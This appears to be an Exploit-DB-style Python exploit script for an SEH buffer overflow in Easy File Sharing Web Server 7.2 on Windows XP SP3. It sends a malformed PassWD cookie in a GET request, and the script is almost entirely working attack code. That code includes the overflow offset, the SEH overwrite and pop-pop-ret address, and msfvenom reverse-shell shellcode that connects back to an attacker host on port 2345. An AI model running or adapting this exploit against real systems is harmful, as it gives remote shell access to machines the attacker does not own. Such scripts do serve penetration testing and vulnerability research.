#!/usr/bin/python
# Exploit Title: Easy File Sharing Web Server 7.2 - GET HTTP Request (PassWD) Buffer Overflow (SEH)
# Date: 19 June 2017
# Exploit Author: clubjk
# Author Contact: jk@jkcybersecurity.com
# Vendor Homepage: http://www.sharing-file.com
# Software Link: https://www.exploit-db.com/apps/60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe
# Version: Easy File Sharing Web Server 7.2
# Tested on: WinXP SP3
# Usage: ./exploit.py
# [*] Connecting to Target 192.168.188.132...standby...
# [*] Successfully connected to 192.168.188.132...
# [*] Sending improperly formed request...
# [!] Request has been sent!


import socket,os,time, sys
 
host = "192.168.188.132"
port = 80


#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.188.133 LPORT=2345 -f py -b "\x00"
buf =  ""
buf += "\xdb\xd2\xd9\x74\x24\xf4\x5f\xba\xb7\xe7\x7d\x1e\x29"
buf += "\xc9\xb1\x52\x83\xef\xfc\x31\x57\x13\x03\xe0\xf4\x9f"
buf += "\xeb\xf2\x13\xdd\x14\x0a\xe4\x82\x9d\xef\xd5\x82\xfa"
buf += "\x64\x45\x33\x88\x28\x6a\xb8\xdc\xd8\xf9\xcc\xc8\xef"
buf += "\x4a\x7a\x2f\xde\x4b\xd7\x13\x41\xc8\x2a\x40\xa1\xf1"
buf += "\xe4\x95\xa0\x36\x18\x57\xf0\xef\x56\xca\xe4\x84\x23"
buf += "\xd7\x8f\xd7\xa2\x5f\x6c\xaf\xc5\x4e\x23\xbb\x9f\x50"
buf += "\xc2\x68\x94\xd8\xdc\x6d\x91\x93\x57\x45\x6d\x22\xb1"
buf += "\x97\x8e\x89\xfc\x17\x7d\xd3\x39\x9f\x9e\xa6\x33\xe3"
buf += "\x23\xb1\x80\x99\xff\x34\x12\x39\x8b\xef\xfe\xbb\x58"
buf += "\x69\x75\xb7\x15\xfd\xd1\xd4\xa8\xd2\x6a\xe0\x21\xd5"
buf += "\xbc\x60\x71\xf2\x18\x28\x21\x9b\x39\x94\x84\xa4\x59"
buf += "\x77\x78\x01\x12\x9a\x6d\x38\x79\xf3\x42\x71\x81\x03"
buf += "\xcd\x02\xf2\x31\x52\xb9\x9c\x79\x1b\x67\x5b\x7d\x36"
buf += "\xdf\xf3\x80\xb9\x20\xda\x46\xed\x70\x74\x6e\x8e\x1a"
buf += "\x84\x8f\x5b\x8c\xd4\x3f\x34\x6d\x84\xff\xe4\x05\xce"
buf += "\x0f\xda\x36\xf1\xc5\x73\xdc\x08\x8e\xbb\x89\xae\xcb"
buf += "\x54\xc8\xce\xda\x8d\x45\x28\xb6\xdd\x03\xe3\x2f\x47"
buf += "\x0e\x7f\xd1\x88\x84\xfa\xd1\x03\x2b\xfb\x9c\xe3\x46"
buf += "\xef\x49\x04\x1d\x4d\xdf\x1b\x8b\xf9\x83\x8e\x50\xf9"
buf += "\xca\xb2\xce\xae\x9b\x05\x07\x3a\x36\x3f\xb1\x58\xcb"
buf += "\xd9\xfa\xd8\x10\x1a\x04\xe1\xd5\x26\x22\xf1\x23\xa6"
buf += "\x6e\xa5\xfb\xf1\x38\x13\xba\xab\x8a\xcd\x14\x07\x45"
buf += "\x99\xe1\x6b\x56\xdf\xed\xa1\x20\x3f\x5f\x1c\x75\x40"
buf += "\x50\xc8\x71\x39\x8c\x68\x7d\x90\x14\x98\x34\xb8\x3d"
buf += "\x31\x91\x29\x7c\x5c\x22\x84\x43\x59\xa1\x2c\x3c\x9e"
buf += "\xb9\x45\x39\xda\x7d\xb6\x33\x73\xe8\xb8\xe0\x74\x39"

crash = "/.:/"                #unusual but needed
crash += "A"*53               #offset
crash += "\xeb\x10\x90\x90"   #seh
crash += "\x05\x86\x01\x10"   #pop pop ret ImageLoad.dll (WinXP SP3)
crash += "D"*10               #junk
crash += buf                  #shellcode
crash += "E"*2600             #total string needs to be about 3000 chars

 
request = "GET /vfolder.ghp HTTP/1.1\r\n"
request += "Host: " + host + "\r\n"
request += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0" + "\r\n"
request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + "\r\n"
request += "Accept-Language: en-US,en;q=0.5" + "\r\n"
request += "Accept-Encoding: gzip, deflate" + "\r\n"
request += "Referer: " + "http://" + host + "/" + "\r\n"
request += "Cookie: SESSIONID=16246; UserID=PassWD=" + crash + "; frmUserName=; frmUserPass=;"
request += " rememberPass=202.197.208.215.201"
request += "\r\n"
request += "Connection: keep-alive" + "\r\n"
request += "If-Modified-Since: Mon, 19 Jun 2017 17:36:03 GMT" + "\r\n"

print "[*] Connecting to Target " + host + "...standby..."

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)


try:
	connect=s.connect((host, port))
	print "[*] Successfully connected to " + host + "!!!"
except:
	print "[!] " + host + " didn't respond\n"
	sys.exit(0)


print "[*] Sending improperly formed request..."
s.send(request + "\r\n\r\n")
print "[!] Request has been sent!\n"
s.close()